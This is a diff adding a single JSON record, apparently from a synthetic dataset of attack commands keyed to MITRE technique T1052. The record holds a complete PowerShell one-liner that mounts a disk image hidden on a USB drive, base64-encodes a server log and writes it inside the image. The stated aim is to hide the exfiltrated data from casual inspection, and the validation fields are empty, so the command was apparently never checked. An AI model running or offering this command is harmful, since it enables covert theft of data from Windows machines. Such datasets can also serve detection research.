@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $vhd=Join-Path $usb 'cache.vhdx'; Mount-DiskImage -ImagePath $vhd -PassThru | Out-Null; $dl=((Get-DiskImage -ImagePath $vhd | Get-Disk | Get-Partition | Get-Volume)[0].DriveLetter); $out=Join-Path (\"$($dl):\\\") 'logs.b64'; [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Logs\\server.log')) | Out-File -Encoding ASCII $out; Dismount-DiskImage -ImagePath $vhd",
+  "explanation": "Mounts a VHDX on the USB and writes base64-encoded log data inside it to reduce casual inspection.",
+  "rationale_steps": [
+    "Mount USB-hosted VHDX",
+    "Base64-encode selected data",
+    "Write encoded data inside mounted image",
+    "Dismount to finalize storage on USB"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-5d8a6105",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
